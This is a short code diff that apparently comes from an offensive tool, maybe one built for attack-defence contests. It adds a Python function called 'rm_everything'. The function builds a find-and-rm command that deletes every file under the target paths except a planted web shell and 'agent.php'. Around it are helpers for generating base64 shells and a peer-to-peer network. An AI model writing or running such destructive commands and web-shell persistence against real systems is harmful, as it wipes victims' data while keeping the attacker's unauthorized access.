@@ -315,6 +315,12 @@ def run_p2p(target,target_port,cmd):
     debug_print(cmd)
     return cmd
 
+def rm_everything(target,target_port,cmd):
+    shell_name,shell,shell_base64 = generate_shell(target,target_port,cmd,1)
+    agent_name = 'agent.php'
+    cmd = 'find %s ! -name "%s" ! -name "%s" -exec rm -f {} \;'%(rm_ev_paths,shell_name,agent_name)
+    debug_print(cmd)
+    return cmd
 
 # This function is designed to generate a p2p network
 def create_p2p(target,target_port,cmd):
